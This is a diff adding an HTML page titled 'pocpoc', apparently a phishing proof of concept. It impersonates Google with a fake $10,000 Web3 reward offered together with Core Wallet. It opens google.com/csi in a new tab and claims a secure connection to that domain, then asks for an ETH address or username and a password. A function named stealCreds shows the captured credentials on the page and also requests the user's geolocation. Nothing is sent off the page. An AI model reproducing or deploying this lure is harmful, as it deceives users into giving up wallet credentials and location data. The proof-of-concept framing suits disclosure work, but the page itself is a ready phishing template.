@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <title>pocpoc</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #fff;
+        text-align: center;
+      }
+      .box {
+        max-width: 420px;
+        padding: 32px;
+      }
+      h1 {
+        color: #4285f4;
+        margin-bottom: 12px;
+      }
+      p {
+        color: #666;
+        margin-bottom: 24px;
+      }
+      button {
+        padding: 12px 20px;
+        border: none;
+        border-radius: 8px;
+        background: #4285f4;
+        color: #fff;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      .fake-panel {
+        display: none;
+        margin-top: 24px;
+        padding: 20px;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        background: #fafafa;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+      <h2>
+        Google is providing a $10,000 reward pool in collaboration with Core
+        Wallet for active Web3 users
+      </h2>
+      <button id="triggerBtn" onclick="runPoC()">Click Here</button>
+
+      <div class="fake-panel" id="panel">
+        <h3>
+          You are securely connected to the official domain
+          <strong>www.google.com/csi</strong>. To verify your wallet ownership
+          and eligible region, please enter your username/address eth and
+          password credentials and allow location access to earn $10k USD from
+          Google.
+        </h3>
+        <form id="phishForm" onsubmit="stealCreds(event)">
+          <div>
+            <label>Username or Address ETH:</label><br />
+            <input
+              type="text"
+              id="username"
+              name="username"
+              size="24"
+              required
+            />
+          </div>
+          <div style="margin-top: 10px">
+            <label>Password:</label><br />
+            <input
+              type="password"
+              id="password"
+              name="password"
+              size="30"
+              required
+            />
+          </div>
+          <div style="margin-top: 15px">
+            <button type="submit">Submit to get $10k usd</button>
+          </div>
+        </form>
+
+        <div id="result" style="margin-top: 10px"></div>
+
+        <div
+          id="output"
+          style="margin-top: 10px; font-weight: bold; color: #1a73e8"
+        ></div>
+      </div>
+    </div>
+
+    <script>
+      function getLocation() {
+        const output = document.getElementById("output");
+        if (!navigator.geolocation) {
+          output.textContent = "Geolocation is not supported.";
+          return;
+        }
+
+        output.textContent = "Requesting location...";
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            output.textContent = `Location Captured: Latitude ${pos.coords.latitude}, Longitude ${pos.coords.longitude}`;
+          },
+          (err) => {
+            output.textContent = "Permission denied: " + err.message;
+          },
+        );
+      }
+
+      function stealCreds(event) {
+        event.preventDefault();
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        getLocation();
+
+        if (username && password) {
+          document.getElementById("result").innerHTML =
+            `<strong style="color:green;">CREDENTIALS CAPTURED</strong><br> Username: ${username}<br> Password: ${password}`;
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
+        }
+      }
+
+      function runPoC() {
+        const w = window.open("https://www.google.com/csi", "_blank");
+        document.getElementById("panel").style.display = "block";
+        document.getElementById("triggerBtn").style.display = "none";
+        document.getElementById("intro").style.display = "none";
+      }
+    </script>
+  </body>
+</html>
